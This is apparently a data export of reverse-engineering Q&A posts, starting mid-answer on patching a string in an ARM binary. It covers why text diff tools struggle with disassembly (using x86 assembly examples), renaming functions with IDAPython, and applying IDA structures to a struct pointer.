<p>So if you really want to change an offset like this, get familiar with the thumb manual I linked above, learn each and every bit, and assemble the new instructions manually. Or, just (ab)use the gnu assembler in the way I outlined in my answer to <a href=""https://reverseengineering.stackexchange.com/questions/9094/offset-calculation-for-branch-instruction-in-arm/9096#9096"">this question</a>. Just write a bare minimum assembler snippet and have <code>as</code> handle the gory details for you.</p>

<p>But, as @joxeankoret said: if you just want to change a string, and don't need the original string anwhere else, and the new string isn't longer than the old one, overwriting the string with the new one will be much easier than finding a place for your new string and adjusting the offsets. You can jump to that position by double clicking the label in IDA, or just scroll to the address <code>2FF4C</code> (<code>1A5A6+9F56</code>).</p>
","13202"
"Why are special tools required to ascertain the differences between two related binary code files?","2612","","<p>How comes that text diffing tools like <code>diff</code>, <code>kdiff3</code> or even more complex ones usually fail at highlighting the differences between two disassemblies in textual form - in particular two <em>related</em> binary executable files such as different versions of the same program?</p>

<p>This is the question <a href=""https://reverseengineering.stackexchange.com/users/107/gilles"">Gilles</a> asked <a href=""https://reverseengineering.stackexchange.com/questions/1879/"">over here</a> in a comment:</p>

<blockquote>
  <p>Why is diff/meld/kdiff/... on the disassembly not satisfactory?</p>
</blockquote>

<p>I thought this question deserves an answer, <a href=""http://blog.stackoverflow.com/2011/07/its-ok-to-ask-and-answer-your-own-questions/"">so I'm giving an answer Q&amp;A style</a>, because it wouldn't fit into a 600 character comment for some strange reason ;)</p>

<p><strong>Please don't miss out on <a href=""https://reverseengineering.stackexchange.com/a/1907/245"">Rolf's answer</a>, though!</strong></p>
","<h1>Index (shortened)</h1>

<ul>
<li>Gentle Intro - binary executable code, how does it look?</li>
<li>Why it is a hard task to compare binary executable code?</li>
<li>Conclusion</li>
<li>Solutions</li>
<li>TL;DR</li>
</ul>

<p><strong>TL;DWTR (too long, don't want to read):</strong> skip ahead to the section <em>Why it is a hard task to compare binary executable code?</em> if you feel comfortable with the basics around assembly and disassembly. Alternatively skip to the bottom of this answer (<em>TL;DR</em>).</p>

<h1>Gentle Intro - binary executable code, how does it look?</h1>

<p>Binary executable code is made for computers to read, this is why it is commonly referred to as <a href=""https://en.wikipedia.org/wiki/Machine_code"" rel=""nofollow noreferrer"">machine code</a>. This means it is binary ""data"" that is usually represented as <a href=""https://en.wikipedia.org/wiki/Hexadecimal"" rel=""nofollow noreferrer"">hexadecimal numbers</a> to the naked eye. A category of <a href=""/questions/tagged/tools"" class=""post-tag"" title=""show questions tagged &#39;tools&#39;"" rel=""tag"">tools</a> named ""hex editors"" exists for this task.</p>

<p>Here's how this commonly looks, using <a href=""http://hte.sourceforge.net/"" rel=""nofollow noreferrer"">HTE</a> for the screenshot:</p>

<p><img src=""https://i.stack.imgur.com/gKhUF.png"" alt=""HT Editor""></p>

<p>The reason this is so convenient is because each hex digit represents exactly one nibble, that is 4 bits. So two hex digits can be used to represent a single 8-bit byte (the most common type of byte). Then showing them in multiples of 16 bytes per line has the additional advantage of making it easier to read the hexadecimal offset (given as 8-digit hexadecimal number in front of the hex bytes in the screenshot above), because decimal <code>16</code> is <code>0x10</code>. The most common notations for hexadecimal numbers are:</p>

<ul>
<li>prefix <code>0x</code>: e.g. <code>0x10</code> (C and related languages)</li>
<li>prefix <code>$</code>: e.g. <code>$10</code> (Pascal, Delphi)</li>
<li>suffix <code>h</code>: e.g. <code>10h</code> (assembly language)</li>
</ul>

<p>Side-note: the line between code and data is a thin one and disassemblers sometimes struggle to identify the bytes in a binary file as one or the other, although heuristics can be applied to help in the process of identification.</p>

<h2>Assembly</h2>

<p>Aside from the ""raw"" form of hexadecimal numbers there is also the human-readable representation known as <a href=""https://en.wikipedia.org/wiki/Assembly_language"" rel=""nofollow noreferrer"">assembly language</a>. This is a <a href=""https://en.wikipedia.org/wiki/Mnemonic"" rel=""nofollow noreferrer"">mnemonic</a> form of the binary instructions (or opcodes) and usually represents them 1:1 with very minor abstractions. The notable exception to this are macro assemblers such as <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=12654"" rel=""nofollow noreferrer"">Microsoft's MASM</a> which provide a higher levels of abstraction as a convenience.</p>

<p>Side-note: the program that digests assembly language code (also ""assembly code"" or ""assembler code"") is called an <strong>assembler</strong>.</p>

<p>Depending on the type of processor and the exact architecture, various flavors of assembly language exist. For the scope of this question we'll stick with the <a href=""https://en.wikipedia.org/wiki/IA-32"" rel=""nofollow noreferrer"">IA-32 architecture</a> - also known as x86 (32bit, <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a>), because its origins lie with the 8088 and 8086 processors, with subsequent processor (CPU) models being numbered <code>80x86</code>, where <code>x</code> was a one-digit number. Starting with the 80586 Intel departed from that naming scheme as they introduced the Pentium.</p>

<p>Nevertheless, it is good to know that two main processor architectures exist: <a href=""https://en.wikipedia.org/wiki/Complex_instruction_set_computing"" rel=""nofollow noreferrer"">CISC</a> (68k, x86, x86-64) and <a href=""https://en.wikipedia.org/wiki/Reduced_instruction_set_computing"" rel=""nofollow noreferrer"">RISC</a> (SPARC, MIPS, PPC), whereas the aficionados of one or the other have claimed victory for their preferred architecture at one time or another, both still exist to this very day, although at the microcode level one could even argue CISC architectures to be RISC ""internally"". That said, x86 <em>is</em> a CISC architecture.</p>

<p>Just to give you glimpse of what RISC and CISC look like in comparison, let's look at a few basic x86 and <a href=""https://en.wikipedia.org/wiki/MIPS_architecture"" rel=""nofollow noreferrer"">MIPS instructions</a>:</p>

<pre><code> x86          |    MIPS              | Meaning
-----------------------------------------------
 mov          | lb, lw, sb, move     | copy/""move"" value from/to register/memory location
 jmp, jz, jnz | j/b, beq, beqz, bgez | jump unconditionally or on condition
 call         | jal                  | call other routine / jump and link
</code></pre>

<p>What hopefully becomes clear at first glance (line with <code>mov</code>) is the fact that in MIPS you heave a much larger number of very basic instructions than x86, which is the gist of the CISC versus RISC paradigm. Another thing is that we see how MIPS uses <code>j</code> and <code>b</code> as the mnemonic prefix for jump and branch (the difference being generally the distance these ""jumps"" can cover), whereas x86 uses also <code>j</code> as in <code>jmp</code> (unconditional jump), <code>jnz</code> (jump if not zero[-flag set]) but also has a dedicated <code>call</code> opcode which MIPS to my knowledge doesn't have - the closest approximation probably being <code>jal</code> (jump and link) which also stores the <a href=""https://en.wikipedia.org/wiki/Program_counter"" rel=""nofollow noreferrer"">program counter</a> in a register as opposed to x86's <code>call</code>, though, which stores it on the stack.</p>

<p>In CISC you can do a relatively complex operation with a single instruction, where in RISC you often need several instructions to express the same thing. In fact assemblers for RISC architectures tend to have so-called pseudo-instructions which combine oft-used combinations of instructions, but which get translated to individual RISC instructions during the translation phase.</p>

<p>An example would be the <code>ror</code> (bit-rotate right) instruction. On an x86 (CISC) this is an opcode in its own right with the <code>ror</code> mnemonic. On MIPS (RISC) this is a pseudo-instruction if and when the assembler offers it and it gets translated as follows (bit-rotate the value in register <code>$t2</code> by one bit and store result in <code>$t2</code> again):</p>

<pre><code>ror $t2, $t2, 1    --&gt;   sll $1 , $10, 31  (bit-shift $10 left by 31, store in $1)
                         srl $10, $10, 1   (bit-shift $10 right by 1, store in $10)
                         or  $10, $10, $1  (bit-wise or $1 and $10)
</code></pre>

<p>This example is taken from the book referenced a bit further down from here (<em>MIPS resources</em>), page 370.</p>

<p>However, we won't dig further into assembly language <em>basics</em> and instead focus on answering the question. I think it is not necessary to understand much more than the most fundamental facts to understand why simple and even complex diff tools fail at showing the differences of binary executable files.</p>

<h3>Compilers and assembly language</h3>

<p><a href=""https://en.wikipedia.org/wiki/Compiler"" rel=""nofollow noreferrer"">Compilers</a> (<a href=""/questions/tagged/compilers"" class=""post-tag"" title=""show questions tagged &#39;compilers&#39;"" rel=""tag"">compilers</a>) convert code constructs usually written by humans or machines into machine code [*]. The usual translation is to translate the human-readable source code into an intermediate form which gets then optimized and after optimization translated to assembly language which in turn gets translated to machine code. This is shown beautifully in the Wikipedia article above, with the diagram I am reproducing here below:</p>

<p><img src=""https://i.stack.imgur.com/aHGlr.png"" alt=""How a compiler works""></p>

<p>The gist is, that compilers usually have an assembler somewhere in their back end, even though you may never get to see the actual assembly language instructions yourself. If you wanted to get it, you would use:</p>

<ul>
<li>With GCC: <code>gcc -S ...</code> (AT&amp;T syntax) or <code>gcc -masm=intel -S ...</code> (Intel syntax)</li>
<li>With Microsoft Visual C++: <code>cl.exe /Fa ...</code></li>
</ul>

<p>[*] this is not the entire truth, as there are compilers which will create an intermediate <a href=""https://en.wikipedia.org/wiki/Byte_code"" rel=""nofollow noreferrer"">byte code</a> which then later gets translated further into machine code native to the CPU it is running on or interpreted on-the-fly. But for the scope of this answer we'll consider compilers to be the entities that convert human-readable high-level language source code into machine code through a number of processing stages, one of which involves assembly code.</p>

<p>NB: some compilers, such as Embarcadero Delphi will hide the different stages from you and present the process from compiling to linking as one opaque step. This can cause some confusion in Delphians attempting to learn C/C++ which <em>expose</em> the different steps.</p>

<h3>Intel versus AT&amp;T syntax</h3>

<p>For x86 there exist two competing syntax variants. The AT&amp;T syntax is favored in the *nix world and by <a href=""https://en.wikipedia.org/wiki/GNU_Assembler"" rel=""nofollow noreferrer"">GASM</a>, Intel in the Windows world and most disassemblers and assemblers. Consider this simple C program:</p>

<pre><code>#include &lt;stdio.h&gt;

int main()
{
    printf(""Hello world!\n"");
    return 0;
}
</code></pre>

<p>... and the translations with the AT&amp;T (<code>gcc -S hello.c</code> or explicitly <code>gcc -masm=att -S hello.c</code>) and Intel (<code>gcc -masm=intel -S hello.c</code>) syntax respectively:</p>

<pre><code> AT&amp;T                        |  Intel
------------------------------------------------------------------------
.LC0:                        | .LC0:
    .string ""Hello world!""   |     .string ""Hello world!""
    .text                    |     .text
.globl main                  | .globl main
    .type   main, @function  |     .type   main, @function
main:                        | main:
    pushl   %ebp             |     push    ebp
    movl    %esp, %ebp       |     mov ebp, esp
    andl    $-16, %esp       |     and esp, -16
    subl    $16, %esp        |     sub esp, 16
    movl    $.LC0, (%esp)    |     mov DWORD PTR [esp], OFFSET FLAT:.LC0
    call    puts             |     call    puts
    movl    $0, %eax         |     mov eax, 0
    leave                    |     leave
    ret                      |     ret
</code></pre>

<p>You'll notice how the syntax differs. Registers in AT&amp;T syntax are denoted with the <code>%</code>, literal values with <code>$</code> and the position of source and destination register is the inverse of the Intel syntax. Furthermore some of the mnemonics differ (<code>movl</code> instead of <code>mov</code>). In Intel syntax the size of the operands helps to infer the intended operation - in case of registers this is made explicit by using EAX, AX and AL/AH respectively to denote the <code>DWORD</code> (32bit), <code>WORD</code> (16bit) and <code>BYTE</code> (8bit) sizes. However, the line:</p>

<pre><code>mov DWORD PTR [esp], OFFSET FLAT:.LC0
</code></pre>

<p>shows neatly how you have to be explicit about the size of memory locations to get it right. The AT&amp;T <code>movl</code> mnemonic implies this because of its inherent meaning of ""move long"" (32bit here), so no need to mention that we are accessing a <code>DWORD</code> other than in the <code>l</code> in <code>movl</code>.</p>

<p><strong>Please note:</strong> I trimmed some irrelevant parts at the top and the bottom of the generated assembly code for brevity.</p>

<h3>MIPS resources</h3>

<p>For the inclined reader I would recommend getting a copy of the excellent, albeit pricey:</p>

<ul>
<li>""Introduction to Assembly Language Programming"", 2nd ed., by Sivarama P. Dandamudi, Springer 2004/2005 (ISBN 978-0-387-20636-3)</li>
</ul>

<p>If you want to experiment with MIPS, you can get <a href=""http://spimsimulator.sourceforge.net/"" rel=""nofollow noreferrer"">SPIM</a>, refer to its documentation or simply use a search engine to find useful information such as this <a href=""http://people.cs.pitt.edu/~xujie/cs447/Mips/sub.html"" rel=""nofollow noreferrer"">Quick Tutorial</a>.</p>

<h3>x86 resources</h3>

<ul>
<li>The book mentioned above in the MIPS resources also discusses x86 assembly</li>
<li>Randall Hyde's <a href=""http://www.plantation-productions.com/Webster/www.artofasm.com/index.html"" rel=""nofollow noreferrer"">""Art of Assembly"" book</a></li>
<li><a href=""http://www.woodmann.com/RCE-CD-SITES/Iczelion/"" rel=""nofollow noreferrer"">Iczelion's old website</a></li>
</ul>

<p>Again, use a search engine to find more information or consult the documentation of your favorite assembler, such as <a href=""http://nasm.us/"" rel=""nofollow noreferrer"">NASM</a>.</p>

<h2>Disassembly</h2>

<p>The process of translating the binary machine language back to a mnemonic representation, usually 1:1, is called <strong>disassembling</strong> or <strong>disassembly</strong>. The result of the process is commonly referred to as <strong>disassembly</strong> as well.</p>

<p>The tool used for the process is called a <strong>disassembler</strong>.</p>

<p>Since this is mostly a 1:1 process just like the reverse (assembly to machine code) there is no need to go into much more detail. There is one big difference between hand-written or compiler-generated assembly versus disassembly of the resulting binary code, and we'll see that a bit better by comparing the output of a disassembler and a compiler.</p>

<p>So without much further ado let's go to a practical example that shows why diffing is hard.</p>

<h1>Why it is a hard task to compare binary executable code?</h1>

<p><strong>Note:</strong> For the remainder of this answer we'll use the Intel syntax for the assembly code. We'll also have some redundant parts of GCCs output removed for brevity.</p>

<h2>Sample program - first iteration</h2>

<h3>C version</h3>

<p>In our first iteration we have the following C code (I named it <code>ptest1.c</code>):</p>

<pre><code>#include &lt;stdio.h&gt;

int syntax_help(int argc)
{
        return 20 + argc;
}

int main(int argc, char **argv)
{
        if (argc &lt; 3)
                return syntax_help(argc);
        else if (argc == 3)
                return 42;
        // else ...
        return 0;
}
</code></pre>

<h3>Assembly language version (with GCC, Intel syntax)</h3>

<p>... compiling this into assembly with <code>gcc -O0 -masm=intel -S -o ptest1.asm ptest1.c</code> gives us:</p>

<pre><code>.globl syntax_help
        .type   syntax_help, @function
syntax_help:
        push    ebp
        mov     ebp, esp
        mov     eax, DWORD PTR [ebp+8]
        add     eax, 20
        pop     ebp
        ret
        .size   syntax_help, .-syntax_help
.globl main
        .type   main, @function
main:
        push    ebp
        mov     ebp, esp
        sub     esp, 4
        cmp     DWORD PTR [ebp+8], 2
        jg      .L4
        mov     eax, DWORD PTR [ebp+8]
        mov     DWORD PTR [esp], eax
        call    syntax_help
        jmp     .L5
.L4:
        cmp     DWORD PTR [ebp+8], 3
        jne     .L6
        mov     eax, 42
        jmp     .L5
.L6:
        mov     eax, 0
.L5:
        leave
        ret
</code></pre>

<h2>Sample program - second iteration</h2>

<p>Now let us modify the program a little and then assemble it again, just to see how it looks.</p>

<h3>C version</h3>

<pre><code>#include &lt;stdio.h&gt;

int syntax_help(int argc)
{
        switch (argc)
        {
        case 0:
                return -1;
        case 1:
                return 23;
        default:
                return 20 + argc;
        }
}

int main(int argc, char **argv)
{
        if (argc &lt; 5)
                return syntax_help(argc);
        else if (argc == 5)
                return 42;
        // else ...
        return 0;
}
</code></pre>

<p>As you can see the two instances of <code>3</code> in <code>main</code> changed to <code>5</code> and we tinkered a bit with the ""logic"" in <code>syntax_help</code>. Clearly this is a contrived example, but then that's the exact point.</p>

<h3>Assembly language version (same options as above)</h3>

<pre><code>.globl syntax_help
        .type   syntax_help, @function
syntax_help:
        push    ebp
        mov     ebp, esp
        mov     eax, DWORD PTR [ebp+8]
        test    eax, eax
        je      .L3
        cmp     eax, 1
        je      .L4
        jmp     .L7
.L3:
        mov     eax, -1
        jmp     .L5
.L4:
        mov     eax, 23
        jmp     .L5
.L7:
        mov     eax, DWORD PTR [ebp+8]
        add     eax, 20
.L5:
        pop     ebp
        ret
        .size   syntax_help, .-syntax_help
.globl main
        .type   main, @function
main:
        push    ebp
        mov     ebp, esp
        sub     esp, 4
        cmp     DWORD PTR [ebp+8], 4
        jg      .L9
        mov     eax, DWORD PTR [ebp+8]
        mov     DWORD PTR [esp], eax
        call    syntax_help
        jmp     .L10
.L9:
        cmp     DWORD PTR [ebp+8], 5
        jne     .L11
        mov     eax, 42
        jmp     .L10
.L11:
        mov     eax, 0
.L10:
        leave
        ret
</code></pre>

<p>That's a mouthful. Now let's dig into one difference - aside from the ""optimization"" aspect - between this and a potential human-written piece of assembly that does the same. Here's what a human-written version might look like:</p>

<pre><code>.globl syntax_help
    .type   syntax_help, @function
syntax_help:
    push    ebp
    mov ebp, esp
    mov eax, DWORD PTR [ebp+8]
    test    eax, eax
    je  .zero_args
    cmp eax, 1
    je  .one_arg
    jmp .return_20plus
.zero_args:
    mov eax, -1
    jmp .exit_help
.one_arg:
    mov eax, 23
    jmp .exit_help
.return_20plus:
    mov eax, DWORD PTR [ebp+8]
    add eax, 20
.exit_help:
    pop ebp
    ret
    .size   syntax_help, .-syntax_help
.globl main
    .type   main, @function
main:
    push    ebp
    mov ebp, esp
    sub esp, 4
    cmp DWORD PTR [ebp+8], 4
    jg  .return_42
    mov eax, DWORD PTR [ebp+8]
    mov DWORD PTR [esp], eax
    call    syntax_help
    jmp .exit
.return_42:
    cmp DWORD PTR [ebp+8], 5
    jne .return_0
    mov eax, 42
    jmp .exit
.return_0:
    mov eax, 0
.exit:
    leave
    ret
</code></pre>

<p>Anyone who has ever written assembly code will inevitably notice how I am not declaring variables (<code>db</code>, <code>dw</code>, <code>dd</code>) here. This would be the normal course of action, but of course here I was merely showing that we humans tend to give symbolic names to code locations (and variables). If you hand write assembly, it would look still different, I merely adjusted the code to look a bit more like what a human might write (i.e. it's not perfect and certainly not ""hand-optimized""). The compiler will stubbornly and efficiently tack a number on some kind of lettered prefix and be done with it. Let's also create a possible human-written version of the first iteration, using the same names:</p>

<pre><code>.globl syntax_help
    .type   syntax_help, @function
syntax_help:
    push    ebp
    mov ebp, esp
    mov eax, DWORD PTR [ebp+8]
    add eax, 20
    pop ebp
    ret
    .size   syntax_help, .-syntax_help
.globl main
    .type   main, @function
main:
    push    ebp
    mov ebp, esp
    sub esp, 4
    cmp DWORD PTR [ebp+8], 2
    jg  .return_42
    mov eax, DWORD PTR [ebp+8]
    mov DWORD PTR [esp], eax
    call    syntax_help
    jmp .exit
.return_42:
    cmp DWORD PTR [ebp+8], 3
    jne .return_0
    mov eax, 42
    jmp .exit
.return_0:
    mov eax, 0
.exit:
    leave
    ret
</code></pre>

<h2>Comparing compiler-generated assembly code</h2>

<p>Here's the output of <code>diff ptest1.asm ptest2.asm</code> (the compiler-generated form):</p>

<pre><code>1c1
&lt;       .file   ""ptest1.c""
---
&gt;       .file   ""ptest2.c""
9a10,22
&gt;       test    eax, eax
&gt;       je      .L3
&gt;       cmp     eax, 1
&gt;       je      .L4
&gt;       jmp     .L7
&gt; .L3:
&gt;       mov     eax, -1
&gt;       jmp     .L5
&gt; .L4:
&gt;       mov     eax, 23
&gt;       jmp     .L5
&gt; .L7:
&gt;       mov     eax, DWORD PTR [ebp+8]
10a24
&gt; .L5:
20,21c34,35
&lt;       cmp     DWORD PTR [ebp+8], 2
&lt;       jg      .L4
---
&gt;       cmp     DWORD PTR [ebp+8], 4
&gt;       jg      .L9
25,28c39,42
&lt;       jmp     .L5
&lt; .L4:
&lt;       cmp     DWORD PTR [ebp+8], 3
&lt;       jne     .L6
---
&gt;       jmp     .L10
&gt; .L9:
&gt;       cmp     DWORD PTR [ebp+8], 5
&gt;       jne     .L11
30,31c44,45
&lt;       jmp     .L5
&lt; .L6:
---
&gt;       jmp     .L10
&gt; .L11:
33c47
&lt; .L5:
---
&gt; .L10:
</code></pre>

<p>Not exactly helpful to understanding the differences, is it?</p>

<p><a href=""http://winmerge.org/"" rel=""nofollow noreferrer"">WinMerge</a> provides a more visual result. Chaos ensues ...</p>

<p><img src=""https://i.stack.imgur.com/QCNpW.png"" alt=""WinMerge diff of ptest1.asm and ptest2.asm""></p>

<p>NB: I decided to not doctor a full height screenshot, instead pay attention to the left pane which highlights the differences (yellow) and missing blocks (gray) and moved blocks (brown...ish).</p>

<h2>Comparing ""human-written"" assembly code</h2>

<p>Here's the output of <code>diff ptest1.asm-human ptest2.asm-human</code> (""human-written"" form):</p>

<pre><code>6a7,19
&gt;       test    eax, eax
&gt;       je      .zero_args
&gt;       cmp     eax, 1
&gt;       je      .one_arg
&gt;       jmp     .return_20plus
&gt; .zero_args:
&gt;       mov     eax, -1
&gt;       jmp     .exit_help
&gt; .one_arg:
&gt;       mov     eax, 23
&gt;       jmp     .exit_help
&gt; .return_20plus:
&gt;       mov     eax, DWORD PTR [ebp+8]
7a21
&gt; .exit_help:
17c31
&lt;       cmp     DWORD PTR [ebp+8], 2
---
&gt;       cmp     DWORD PTR [ebp+8], 4
24c38
&lt;       cmp     DWORD PTR [ebp+8], 3
---
&gt;       cmp     DWORD PTR [ebp+8], 5
</code></pre>

<p>Whoa, that's actually almost readable. Use <code>colordiff</code> and it's useful.</p>

<p>The respective visual comparison in WinMerge looks downright readable:</p>

<p><img src=""https://i.stack.imgur.com/qqPY9.png"" alt=""WinMerge diff of ptest1.asm-human and ptest2.asm-human""></p>

<h2>Interlude - basic blocks</h2>

<p>A disassembler can only be smart to a certain extent, because it's a program. Even IDA Pro, hands down the most advanced disassembler as of this writing, will not be able to guess everything right - e.g. when distinguishing code or data. But the more sophisticated tools do a <em>pretty</em> good job at it. And IDA adds the <strong>I</strong> as <strong>interactive</strong>.</p>

<p>One thing disassemblers encounter are what assembly programmers is known as <strong>labels</strong> and <strong>(sub)routines</strong>.</p>

<p>Labels, although they exist in C and are (rightly) frowned upon together with <code>goto</code>, also exist in higher level language, but tend to cover a somewhat different concept. Perhaps the closest to the assembly language concept were the labels in the good old days of <a href=""https://en.wikipedia.org/wiki/BASIC"" rel=""nofollow noreferrer"">BASIC</a>. When you compile C into assembly code, however, every condition gets translated into a conditional or unconditional jump (<code>jmp</code>, <code>je</code>, <code>jg</code>, <code>jne</code> in the above compiler-generated code). The jump targets are referred to as <strong>labels</strong>. The jumps are the places where the code <strong>branches</strong> conditionally or unconditionally.</p>

<p>The closest corresponding concept to a routine would be a function in C or the <code>procedure</code>/<code>function</code> in Pascal or the <code>sub</code> in BASIC.</p>

<p>More or less each of the chunks of code between two branching instructions, other than <code>call</code>, are called <strong>basic blocks</strong>. In IDA Pro this is neatly visualized in the graph view (can be toggled with flat view via default <kbd>Space</kbd>):</p>

<p><img src=""https://i.stack.imgur.com/Y8Puh.png"" alt=""IDA Pro graph view demonstrating a visualization of basic blocks""></p>

<p>Each of the blocks linked by the arrows in the main IDA-view would be a <strong>basic block</strong>.</p>

<h2>Again, why it is a hard task to compare binary executable code?</h2>

<p>By now you should have a faint idea what makes the comparison hard, but let's go the extra mile. Let's switch from comparing the compiler-generated and ""human-written"" assembly code to actual disassembly.</p>

<p>As before we will stick to the gist of it.</p>

<h2>Compiler-generated versus disassembly</h2>

<p>But just to mention it, in the disassembly you have the result after the <a href=""https://en.wikipedia.org/wiki/Linker_%28computing%29"" rel=""nofollow noreferrer"">linker</a> <em>mangled</em> it. The compiler-generated assembly from before contained merely the code <em>we</em> had written in the sample program.</p>

<p>Just to give you an idea, I generated an <code>.asm</code> file using IDA, stripped it down to everything without comments and empty lines and still ended up with 362 lines, as opposed to 52 lines in the original compiler-generated assembly which included meta-data used by the linker. This whopping difference can of course be attributed to the linker adding all kinds of code required to initialize the executable. In fewer words: it's boiler plate code the compiler (or more precisely its linker) adds.</p>

<p>For this comparison I am going to leave out this boiler plate code entirely, although obviously this only adds to the complexity a <code>diff</code> tool will encounter when comparing binary executable code.</p>

<p>Unlike in the IDA screenshot above, which shows <code>ptest2.c</code> disassembled, in reality you will mostly have to work without <a href=""https://en.wikipedia.org/wiki/Debug_symbol"" rel=""nofollow noreferrer"">debug symbols</a>. This means the names such as <code>main</code> and <code>syntax_help</code> will no longer exist. Instead disassemblers such as IDA Pro mostly resort to naming the routines after their offset (e.g. <code>sub_80483DB</code>). It applies the same for labels (i.e. naming those <code>loc_80483F4</code> or <code>locret_something</code>). Of course the reverse engineer is free to change these names to something more readable/recognizable for herself. But the default names still depend on the offset.</p>

<p>In fact the disassembler will have a hard time to identify the <code>main</code> function, because the aforementioned boiler plate code tends to come <em>before</em> it when looking at it starting from the entry point of the executable. Here's what IDA shows you if there are no symbols available to the compiled <code>ptest2.c</code> from before (i.e. ran <code>strip -s ...</code>):</p>

<p><img src=""https://i.stack.imgur.com/XTlLt.png"" alt=""IDA Pro showing the entry point of compiled &lt;code&gt;ptest2.c&lt;/code&gt;""></p>

<p>Now let's look at the entry point for the compiled (and stripped) <code>ptest1.c</code> as well:</p>

<p><img src=""https://i.stack.imgur.com/o0tAE.png"" alt=""IDA Pro showing the entry point of compiled &lt;code&gt;ptest2.c&lt;/code&gt;""></p>

<p>Do you notice the difference? It's subtle, but let me put them side to side for you:</p>

<p><img src=""https://i.stack.imgur.com/L5jXL.png"" alt=""Side by side comparison""></p>

<p>Yes, the highlighted lines ... ooh the offsets differ. What does that mean?</p>

<p>Well, it means that the symbolic names IDA Pro assigns to routines and also to labels (i.e. basic blocks) will differ based on the offset of these entities within the file. </p>

<p>This is very similar indeed to what we encountered before with the compiler-generated assembly code and the numbered label names.</p>

<h3>Using a simpler disassembler</h3>

<p>Let's compare the relevant pieces of code created by a simpler disassembler in a text differ.</p>

<p>Using <code>objdump -M intel -d ...</code> and then getting rid of the leading offsets and spaces we get this for the relevant parts in WinMerge:</p>

<p><img src=""https://i.stack.imgur.com/nn9X8.png"" alt=""WinMerge of the disassembly created with objdump""></p>

<p>Full commands were:</p>

<pre><code>objdump -M intel -d ptest1.stripped|grep '^ 80'|cut -f 2- -d ':'|sed 's/^\s*//g'
objdump -M intel -d ptest2.stripped|grep '^ 80'|cut -f 2- -d ':'|sed 's/^\s*//g'
</code></pre>

<h1>Conclusion</h1>

<p>This means text diffing tools such as <code>diff</code>, <code>kdiff3</code>, <code>WinMerge</code> and many others will have a hard time comparing disassemblies unless the reverse engineer took the time to rename all routines and labels to something not based on the offset.</p>

<p>In fact this becomes an almost insurmountable task when facing a disassembly in textual form. The internal form IDA Pro keeps of the disassembly is much more suitable.</p>

<p>In text form every single changed offset - and there will be loads of those - will draw your attention because it is a difference to a text differ.</p>

<h1>Solutions</h1>

<p>Not that we know the problem, what can we do about it?</p>

<p>Basic blocks are the answer to the problem at hand. Tools like <a href=""http://www.darungrim.org"" rel=""nofollow noreferrer"">DarunGrim</a> (FLOSS), <a href=""http://code.google.com/p/patchdiff2/"" rel=""nofollow noreferrer"">patchdiff2</a> (FLOSS) and Bindiff (commercial) use IDA's knowledge about basic blocks to build graphs. These graphs can then be used to identify similar and different blocks. With the abstraction in the form of a graph the visualization can be superimposed on the respective view inside IDA or a specialized view can be offered.</p>

<p>As you see, when you export your disassembly to a text file, you are stripping a whole lot of contextual information from it which IDA keeps for you in its database. Instead draw from the information IDA already has and use it. Plugins and scripts allow you to reach into the guts of the IDA database and extract what treasures are in there to make sense of basic blocks in a way a text differ will never be able to.</p>

<h2>Tools</h2>

<p>For a listing of tools able to tackle the task, refer to the answers to the question which sparked <em>this</em> one:</p>

<ul>
<li><a href=""https://reverseengineering.stackexchange.com/questions/1879"">how can I diff two x86 binaries at assembly code level?</a></li>
</ul>

<h2>Further reading</h2>

<ul>
<li><strong>Make sure to read <a href=""https://reverseengineering.stackexchange.com/a/1907/245"">Rolf's answer</a> below!</strong></li>
<li><a href=""https://reverseengineering.stackexchange.com/a/1511/245"">How BinDiff works</a>, answer by newgre</li>
<li><a href=""http://www.darungrim.org/Presentations"" rel=""nofollow noreferrer"">http://www.darungrim.org/Presentations</a></li>
<li><a href=""http://www.darungrim.org/Researches"" rel=""nofollow noreferrer"">http://www.darungrim.org/Researches</a></li>
</ul>

<h1>TL;DR</h1>

<p>The reason text differs are insufficient for handling textual disassembly is because the textual representation discards valuable information the disassembler collects during the process of disassembling. Also disassemblers name the code locations and variables after their offsets - changes to a program with subsequent recompilation <strong>will change virtually all offsets and therefore create a lot of noise</strong> in the textual representation. Text differs will point out every single one, making it impossible to find the <em>relevant</em> changes from the reverse engineer's point of view.</p>
","1903"
"Setting name of (newly created) functions via IDAPython","2596","","<p>Is there a way to specify the name of a function when creating it with <code>idc.MakeFunction()</code>?</p>

<p>If not, what is the best practice to rename a function?
I found <code>idc.GetFunctionName(ea)</code> but no counterpart to set a name. A google research turned up some examples where people used <code>idc.MakeNameEx()</code>. Yet, the purpose of <code>MakeNameEx</code>seems to be to rename addresses:</p>

<pre><code>def MakeNameEx(ea, name, flags): """""" Rename an address

@param ea: linear address
@param name: new name of address. If name == """", then delete old name @param
flags: combination of SN_... constants
</code></pre>

<p>And involves a whole bunch of flags such as:</p>

<pre><code>[...]
SN_NOCHECK    = idaapi.SN_NOCHECK    # Replace invalid chars with SubstChar
SN_PUBLIC     = idaapi.SN_PUBLIC     # if set, make name public 
SN_NON_PUBLIC = idaapi.SN_NON_PUBLIC # if set, make name non-public 
SN_WEAK       = idaapi.SN_WEAK       # if set, make name weak 
SN_NON_WEAK   = idaapi.SN_NON_WEAK   # if set, make name non-weak
[...]
</code></pre>

<p>What I need is a simple rename of a function keeping all its properties, flags etc...</p>
","<p><code>idc.MakeName(ea, name)</code> should suffice.</p>

<p>Note that the flags accepted by <a href=""https://www.hex-rays.com/products/ida/support/idadoc/203.shtml"" rel=""nofollow""><code>MakeNameEx()</code></a> don't change the function's properties or function's flags; they're instead used with regard to how the naming itself is handled.</p>
","9021"
"How to apply IDA structure to a pointer of a structure","2589","","<p>I've encountered this function, which accepts a pointer to what I believe is a custom C struct. I came to this conclusion based on subsequent access to it.</p>

<pre><code>arg_0= dword ptr  4   ;struct passed in

push    ebx
push    ebp
mov     ebp, [esp+8+arg_0]  ; store pointer of struct in ebp
push    esi
push    edi
xor     ebx, ebx
</code></pre>

<p>and, not too far from above, I see it being populated:</p>

<pre><code>mov     [ebp+0D4h], bl
mov     [ebp+0F4h], bl
mov     [ebp+114h], bl
xor     eax, eax
mov     [ebp+0B8h], eax
mov     [ebp+0BCh], eax
mov     [ebp+0C0h], eax
</code></pre>

